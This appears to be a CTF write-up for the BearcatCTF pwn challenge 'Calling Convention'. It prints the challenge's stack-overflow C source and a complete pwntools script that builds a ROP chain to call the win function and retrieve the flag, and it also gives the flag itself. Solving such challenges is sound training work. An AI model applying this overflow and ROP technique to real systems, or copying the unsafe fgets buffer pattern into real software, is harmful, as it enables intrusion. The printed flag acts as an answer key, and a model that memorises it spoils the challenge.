https://ctftime.org/event/2596

# Calling Convention (pwn)

You've almost got a good grasp on this. Time to think past your function variables. Make Mudge proud

nc chal.bearcatctf.io 39440

## Analysis

We can see that the binary has no stack canaries and no PIE:

```bash
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

We have control over a large portion of the stack including the return address:

```c
void vuln() {
    fflush(stdout);
    char s[8];
    fgets(s, 0x200, stdin);
}
```

We can perform a simple ret2win provided we meet the constraints first:

```c
void win() {
    FILE *f;
    char c;
    f = fopen("flag.txt", "rt");
    if (key1 != 27000 && key2 != 0xbadf00d && key3 != 0x1337){
        fclose(f);
        exit(1);
    }

    while ( (c = fgetc(f)) != EOF ) {
        printf("%c", c);
        fflush(stdout);
    }
    fclose(f);
}
```

We are given a set of functions to help us meet the various constraints:

```c
void set_key1() {
    if (key3 != 0)
        key1 = 27000;
}

void ahhhhhhhh() {
    if (key1 == 0)
        return;
    key3 = 0;
    key2 = key2 + 0xbad0000;
}

void food() {
    key2 = key2 + 0xf00d;
}

void number3() {
    key3 = 0x1337;
}
```

### Meta

The description makes reference to https://en.wikipedia.org/wiki/Peiter_Zatko with the remark "Make Mudge proud". He is referenced because he wrote one of the first articles on "How to write Buffer Overflows" in 1995 https://insecure.org/stf/mudge_buffer_overflow_tutorial.html and we are required to exploit them to complete this challenge.

## Solution

1) Create a ropchain that ends with `win` but first meets the constraints
    - Take care to offset into the functions as required to avoid unaligning the stack

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./calling_convention", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chal.bearcatctf.io", 39440)

payload = b"A" * 0x10
payload += p64(elf.sym["number3"]+0x8)
payload += p64(elf.sym["set_key1"])
payload += p64(elf.sym["ahhhhhhhh"]+0x8)
payload += p64(elf.sym["food"])
payload += p64(elf.sym["win"]+0x5)

p.sendlineafter(b"> ", payload)

p.readuntil(b"{")

# BCCTF{R0p_Ch41ns_1b01c1c3}
print("BCCTF{" + p.readuntil(b"}").decode())
```

## Flag
`BCCTF{R0p_Ch41ns_1b01c1c3}`

smiley 2025/02/02
